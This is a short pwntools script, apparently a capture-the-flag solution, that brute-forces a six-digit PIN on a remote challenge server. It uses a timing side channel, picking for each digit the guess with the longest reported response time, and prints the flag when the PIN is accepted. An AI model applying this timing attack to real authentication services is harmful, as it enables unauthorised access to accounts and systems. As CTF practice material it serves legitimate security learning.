from pwn import *
import re

r = remote("ctf.csd.lol", 5040)

def try_pin(pin):
    r.recvuntil(b'PIN:')

    log.info(f"Trying: {pin}")
    r.sendline(pin.encode())

    r.recvline()
    res = r.recvline()

    if b'Debug' in res:
        elapsed = float(re.findall(r'Debug: (.+)s', res.decode())[0].strip())
        return elapsed
    else:
        contents = r.recvall().decode()
        print("Flag:", re.findall(r'(csd{.+})', contents)[0])
        exit()

pin = ""

for pos in range(6):
    candidates = {}
    
    print("Pin:", pin.ljust(6, 'x'))

    for i in range(10):
        guess = (pin + str(i)).ljust(6, '0')

        elapsed = try_pin(guess)

        log.info(f'Time: {elapsed}s')
        candidates[i] = elapsed

    pin += str(max(candidates, key=lambda x: candidates[x]))